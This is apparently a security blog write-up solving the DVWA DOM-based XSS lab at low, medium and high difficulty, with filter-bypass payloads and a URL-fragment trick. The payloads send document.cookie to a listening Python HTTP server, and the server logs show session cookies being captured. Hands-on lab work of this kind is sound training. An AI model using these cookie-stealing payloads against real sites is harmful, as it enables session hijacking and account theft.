---
title: DVWA - XSS (DOM)
date: 2023-12-16
categories: [CTF, Web Exploitation]
tags: [dvwa, xss, xss-dom, burp, javascript]
img_path: /assets/dvwa/xss_dom
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## XSS (DOM)

**Cross-Site Scripting (XSS)** attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application using input from a user in the output, without validating or encoding it.

**An attacker can use XSS to send a malicious script to an unsuspecting user**. The end user's browser has no way to know that the script should not be trusted, and will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.

**Document Object Model (DOM) Based XSS** is a special case of reflected where the **JavaScript is hidden in the URL** and pulled out by JavaScript in the page while it is rendering rather than being embedded in the page when it is served. This can make it stealthier than other attacks and WAFs or other protections which are reading the page body do not see any malicious content.

![](https://miro.medium.com/v2/resize:fit:786/1*yuRkBR6YroYLCGpka9KdRA.png)

**Objective**: Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

## Security: Low
> _Low level will not check the requested input, before including it to be used in the output text ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_low_source.php))._

1. We can see that there is the URL parameter `default`:

    ![](url_param.png)

2. We can check if a XSS vulnerability exists by passing a very simple payload:

    ```javascript
    <script>alert(document.cookie)</script>
    ```

    ![](xss_test.png)


3. Our goal is to get our target's cookie value, so we will have to use a payload that grabs his cookie but also send it to us. Let's start by launch a Python3 HTTP server:

    ```shell
    $ python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    ```

4. Then we can pass the following payload, for example, by using social engineering techniques, which grabs the cookie, `document.cookie`, and sends it to our HTTP server, `window.location='http://127.0.0.1:8080/?cookie='`:

    ```javascript
    <script>window.location='http://127.0.0.1:8080/?cookie=' + document.cookie</script>
    ```

    ![](low_payload.png)

5. If we check back on our HTTP server, we will have received the victim's cookie:

    ```shell
    $ python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    127.0.0.1 - - [16/Dec/2023 18:46:37] "GET /?cookie=security=low;%20PHPSESSID=fejtgct45j1cmkcedvieacnai5 HTTP/1.1" 200 -
    127.0.0.1 - - [16/Dec/2023 18:46:37] code 404, message File not found
    127.0.0.1 - - [16/Dec/2023 18:46:37] "GET /favicon.ico HTTP/1.1" 404 -
    ```

## Security: Medium
> _The developer has tried to add a simple pattern matching to remove any references to `"<script"` to disable any JavaScript. Find a way to run JavaScript without using the script tags ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_medium_source.php))._

1. This time the developer replaces the `<script` tag with `?default=English`, so the previous payload won't work. There is a handy [XSS Payload List](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt) on GitHub, so we can choose any other form of payload which does not include the blacklisted tag. Let's try one:

    ```javascript
    <svg/onload=alert(1)>
    ```

    ![](medium_payload_fail.png)

2. The payload does not get replaced, but it does seem to work either. If we take a look at the page's source code, we will see a `select` statement, and if we escape that by changing the payload, it will work:

    ![](medium_page_source.png)

    ```javascript
    </select><svg/onload=alert(1)>
    ```

    ![](medium_payload.png)

3. We can use the same process we used at the previous level to steal our target's cookie:

    ```javascript
    </select><svg/onload=window.location='http://127.0.0.1:8080/?cookie='+document.cookie>
    ```

    ![](medium_payload_cookie.png)

    ```shell
    $ python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    127.0.0.1 - - [16/Dec/2023 20:49:43] "GET /?cookie=PHPSESSID=fejtgct45j1cmkcedvieacnai5;%20security=medium HTTP/1.1" 200
    ```

## Security: High
> _The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_high_source.php))._

1. On this level, the developer has a whitelist allowing only a set of predefined languages; anything else is replaced with `?default=English`. So what happens is that when we sent the GET request with our payload, it gets replaced with `?default=English` and redirected with a new GET request:

    ```javascript
    127.0.0.1:42001/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
    ```

    ![](high_first_request.png)

    ![](high_second_request.png)

2. Reading OWASP's page for [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS), on the *Advanced Techniques and Derivatives* section, we find this:

    _The DOM Based XSS paper details a technique to avoid server side detection. It also describes several other possible locations for the payload, besides `document.location`. The technique to avoid sending the payload to the server hinges on the fact that **URI fragments (the part in the URI after the “#”) is not sent to the server by the browser**. Thus, any client side code that references, say, `document.location`, may be vulnerable to an attack which uses fragments, and in such case the payload is never sent to the server. For example, the above DOM based XSS can be modified into:_

    ```javascript
    http://www.some.site/page.html#default=<script>alert(document.cookie)</script>
    ```

    _which mounts the same attack without it being seen by the server (which will simply see a request for page.html without any URL parameters)._

2. Let's try that to see if it works:

    ```javascript
    127.0.0.1:42001/vulnerabilities/xss_d#default=<script>alert(document.cookie)</script>
    ```

    ![](high_test.png)

3. Let's use the exact same payload as the one used at the low level and get the cookie:

    ```shell
    $ python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    ```

    ```javascript
    127.0.0.1:42001/vulnerabilities/xss_d#default=<script>window.location='http://127.0.0.1:8080/?cookie=' + document.cookie</script>
    ```

    ![](high_payload.png)

    ```shell
    $ python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    127.0.0.1 - - [16/Dec/2023 20:14:15] "GET /?cookie=security=high;%20PHPSESSID=fejtgct45j1cmkcedvieacnai5 HTTP/1.1" 200 -
    ```

## Security: Impossible
> _The contents taken from the URL are encoded by default by most browsers which prevents any injected JavaScript from being executed ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_medium_source.php))._

## Resources

- Cryptocat's [video walkthrough](https://www.youtube.com/watch?v=X87Ubv-qDm4).
- OWASP's [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).
- GitHub's [XSS Payload List](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt).